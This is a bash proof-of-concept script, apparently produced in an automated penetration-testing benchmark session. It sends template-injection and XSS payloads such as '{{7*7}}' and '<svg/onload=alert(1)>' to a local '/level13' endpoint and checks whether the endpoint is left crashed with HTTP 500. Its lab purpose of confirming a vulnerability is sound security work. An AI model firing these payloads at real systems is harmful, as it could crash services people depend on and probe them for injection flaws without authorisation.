#!/bin/bash
# POC: Demonstrates DoS vulnerability on /level13 endpoint. Shows that initial valid request succeeds (HTTP 200), but after sending template injection and XSS payloads, the endpoint crashes and returns HTTP 500 for all subsequent requests, including previously valid ones.
# Target: ./repo
# Created: 2025-11-04T19:30:45.111Z
# Session: benchmark-XBEN-016-24-mhkyd1ay

# DoS Vulnerability POC - /level13 Endpoint Crash
# Demonstrates that the endpoint becomes unrecoverable after processing certain payloads

TARGET_URL="http://localhost:5001/level13"
VALID_PARAM="name=test"

echo "=== DoS Vulnerability POC for /level13 ==="
echo "Target: $TARGET_URL"
echo ""

# Step 1: Initial valid request
echo "[STEP 1] Initial valid request with legitimate parameter..."
RESPONSE_1=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$VALID_PARAM")
HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -n1)
BODY_1=$(echo "$RESPONSE_1" | head -n-1)

echo "Response Code: $HTTP_CODE_1"
if [ "$HTTP_CODE_1" = "200" ]; then
    echo "✓ Initial request successful (HTTP 200)"
    echo "Response contains form: $(echo "$BODY_1" | grep -c 'form\|input')"
else
    echo "✗ Unexpected response: $HTTP_CODE_1"
fi
echo ""

# Step 2: Send template injection payloads
echo "[STEP 2] Sending template injection payloads..."
PAYLOADS=(
    "name={{7*7}}"
    "name=\${7*7}"
    "name={{7*7}}&test={{1+1}}"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$payload")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    echo "  Response: HTTP $HTTP_CODE"
done
echo ""

# Step 3: Send XSS payloads
echo "[STEP 3] Sending XSS payloads..."
XSS_PAYLOADS=(
    "name=<svg/onload=alert(1)>"
    "name=<img/onerror=alert(1)>"
    "name=%3Csvg/onload=alert(1)%3E"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$payload")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    echo "  Response: HTTP $HTTP_CODE"
done
echo ""

# Step 4: Attempt recovery with original valid request
echo "[STEP 4] Attempting recovery - resending original valid request..."
RESPONSE_2=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$VALID_PARAM")
HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -n1)
BODY_2=$(echo "$RESPONSE_2" | head -n-1)

echo "Response Code: $HTTP_CODE_2"
if [ "$HTTP_CODE_2" = "500" ]; then
    echo "✗ CRASH DETECTED: Endpoint now returns HTTP 500"
    echo "Application is in unrecoverable error state"
    CRASH_DETECTED=1
elif [ "$HTTP_CODE_2" = "200" ]; then
    echo "✓ Application recovered successfully"
    CRASH_DETECTED=0
else
    echo "? Unexpected response: $HTTP_CODE_2"
    CRASH_DETECTED=0
fi
echo ""

# Step 5: Multiple recovery attempts to confirm persistent crash
echo "[STEP 5] Multiple recovery attempts to confirm crash persistence..."
for i in {1..3}; do
    RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$VALID_PARAM")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    echo "  Attempt $i: HTTP $HTTP_CODE"
    if [ "$HTTP_CODE" != "500" ]; then
        CRASH_DETECTED=0
    fi
done
echo ""

# Summary
echo "=== VULNERABILITY SUMMARY ==="
if [ "$CRASH_DETECTED" = "1" ]; then
    echo "✓ DoS Vulnerability CONFIRMED"
    echo "  - Initial valid request: HTTP 200 ✓"
    echo "  - After malicious payloads: HTTP 500 ✓"
    echo "  - Application state: CRASHED (no recovery)"
    echo "  - Subsequent requests to same endpoint: Still HTTP 500"
    exit 0
else
    echo "✗ Vulnerability NOT confirmed"
    echo "  Application recovered or did not crash as expected"
    exit 1
fi